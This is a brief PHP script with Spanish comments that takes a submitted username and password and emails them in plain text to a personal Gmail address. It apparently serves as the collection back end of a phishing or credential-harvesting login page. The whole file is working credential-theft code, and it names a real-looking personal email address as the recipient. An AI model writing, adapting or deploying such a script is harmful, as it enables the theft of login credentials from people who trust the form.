$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

// Verificar si los campos están vacíos
if (empty($username) || empty($password)) {
    echo 'Por favor, complete todos los campos.';
    exit;
}

// Configurar los detalles del correo
$to = 'ing.faiber.diaz@gmail.com'; // Correo electrónico del destinatario
$subject = 'Datos de inicio de sesión'; // Asunto del correo
$message = "Datos de inicio de sesión:\n\n";
$message .= "Nombre de usuario: $username\n";
$message .= "Contraseña: $password\n"; // Enviar contraseñas en texto plano no es seguro

// Encabezados del correo
$headers = 'From: no-reply@tudominio.com' . "\r\n" .
           'Reply-To: no-reply@tudominio.com' . "\r\n" .
           'X-Mailer: PHP/' . phpversion();

// Enviar el correo
if (mail($to, $subject, $message, $headers)) {
    echo 'Los datos han sido enviados correctamente.';
} else {
    echo 'Error al enviar los datos.';
}
?>
